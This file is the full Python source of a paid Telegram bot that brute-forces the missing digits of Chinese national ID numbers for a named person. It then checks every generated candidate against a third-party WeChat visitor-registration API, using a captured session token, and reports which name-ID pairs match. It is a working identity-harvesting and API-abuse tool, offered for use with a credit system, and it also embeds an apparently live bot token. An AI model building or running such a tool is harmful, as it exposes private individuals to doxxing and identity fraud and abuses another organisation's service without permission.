import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 配置区 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." # 保持原样

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} # 用于临时缓存生成的号码

# --- 数据加载与保存 ---
def load_data():
    pts, tk = {}, DEFAULT_TOKEN
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r') as f: tk = f.read().strip()
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)

def save_token(new_tk):
    with open(TOKEN_FILE, 'w') as f: f.write(new_tk)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        n = n.upper()
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 核心核验任务 ---
def run_batch_task(chat_id, msg_id, name, id_list):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json", "User-Agent": "Mozilla/5.0"}
    total, success_results, done, is_running = len(id_list), [], 0, True

    def progress_monitor():
        nonlocal done, is_running
        last_text = ""
        while is_running:
            if total > 0:
                percent = int(done / total * 100)
                filled = int(15 * done // total) 
                bar = "█" * filled + "▒" * (15 - filled)
                current_text = f"⏳ **核验中...**\n`[{bar}] {done}/{total} {percent}%`"
                if current_text != last_text:
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=current_text, parse_mode='Markdown')
                        last_text = current_text
                    except: pass
            time.sleep(3)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=8)
            res = r.json()
            if res.get("code") == 401:
                is_running = False
                bot.send_message(chat_id, "🚨 Token 失效，请联系管理员 @aaSm68 更新。")
                return
            if res.get("code") == 0:
                success_results.append(f"✨ **发现成功匹配：**\n{name} `{id_no}` 二要素验证成功 ✅")
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as executor:
        executor.map(verify, id_list)

    is_running = False 
    time.sleep(1)
    if success_results:
        bot.send_message(chat_id, "\n\n".join(success_results), parse_mode='Markdown')
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ 核验完成，未发现匹配结果。")

# --- 按钮回调处理 ---
@bot.callback_query_handler(func=lambda call: call.data.startswith("verify_all_"))
def callback_verify_all(call):
    uid = call.from_user.id
    if uid not in generated_cache:
        bot.answer_callback_query(call.id, "❌ 缓存已过期，请重新生成。")
        return
    
    if user_points.get(uid, 0) < 100:
        bot.answer_callback_query(call.id, "❌ 积分不足(需100)", show_alert=True)
        return

    # 扣费并开始核验
    user_points[uid] -= 100
    save_points()
    
    data = generated_cache[uid]
    msg = bot.send_message(call.message.chat.id, "⚙️ 正在对生成的号码启动全自动核验...")
    threading.Thread(target=run_batch_task, args=(call.message.chat.id, msg.message_id, data['name'], data['ids'])).start()
    
    # 清理缓存防止重复点击
    del generated_cache[uid]
    bot.answer_callback_query(call.id, "🚀 启动核验成功！")

# --- 基础指令 ---
@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
        save_points()
        bot.reply_to(message, f"✅ 积分更新！用户 `{tid}` 余额: `{user_points[int(tid)]}`")
    except: pass

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"👋 **核验模式**\n💰 积分: `{pts}`\n💸 费用: 100/次\n👤 管理员: @aaSm68\n✨ 充值积分请联系管理员\n\n请输入姓名:", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'v_name'}

@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"🛠 **生成模式**\n💰 积分: `{pts}`\n💸 费用: 50/次\n👤 管理员: @aaSm68\n\n请输入基础号(x表示未知):", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'g_card'}

# --- 步骤流 ---
@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_steps(message):
    state = user_states[message.chat.id]
    uid = message.from_user.id
    
    if state['step'] == 'v_name':
        user_states[message.chat.id].update({'step': 'v_ids', 'name': message.text.strip()})
        bot.send_message(message.chat.id, "请发送身份证号列表:")
    
    elif state['step'] == 'v_ids':
        if user_points.get(uid, 0) < 100:
            bot.reply_to(message, "❌ 积分不足")
            return
        raw = re.findall(r'\d{17}[\dXx]', message.text)
        v_ids = [i for i in raw if is_valid_id(i)]
        if not v_ids: 
            bot.reply_to(message, "❌ 无有效号码。")
            return
        user_points[uid] -= 100
        save_points()
        msg = bot.send_message(message.chat.id, "⚙️ 启动核验...")
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, state['name'], v_ids)).start()
        del user_states[message.chat.id]

    elif state['step'] == 'g_card':
        card = message.text.strip().lower()
        if len(card) != 18: return
        user_states[message.chat.id].update({'step': 'g_name', 'card': card})
        bot.send_message(message.chat.id, "请输入要核验的姓名:")

    elif state['step'] == 'g_name':
        user_states[message.chat.id].update({'step': 'g_sex', 'name': message.text.strip()})
        bot.send_message(message.chat.id, "请输入性别(男/女/未知):")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50:
            bot.reply_to(message, "❌ 积分不足(需50)")
            return
        sex_input, card, name = message.text.strip(), state['card'], state['name']
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in card]
        if sex_input == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif sex_input == "女": char_sets[16] = ["0", "2", "4", "6", "8"]

        bot.send_message(message.chat.id, "⏳ 正在深度计算...")
        file_name, valid_ids = "铭.txt", []
        try:
            for res in itertools.product(*char_sets):
                num = "".join(res)
                if is_valid_id(num):
                    valid_ids.append(num)
                if len(valid_ids) >= 5000: break 
            
            if valid_ids:
                user_points[uid] -= 50
                save_points()
                with open(file_name, "w") as f:
                    f.write("\n".join(valid_ids))
                
                # 缓存数据用于后续一键核验
                generated_cache[uid] = {'name': name, 'ids': valid_ids}
                
                # 创建一键核验按钮
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🚀 立即核验全部生成的号码 (100积分)", callback_data=f"verify_all_{uid}"))
                
                with open(file_name, "rb") as doc:
                    bot.send_document(message.chat.id, doc, caption=f"✅ 生成成功！共 `{len(valid_ids)}` 个\n💰 扣除 50 积分\n\n**是否立即开始核验？**", parse_mode='Markdown', reply_markup=markup)
            else:
                bot.send_message(message.chat.id, "❌ 未匹配到合法号码。")
        finally:
            if os.path.exists(file_name): os.remove(file_name)
        del user_states[message.chat.id]

if __name__ == '__main__':
    bot.infinity_polling()
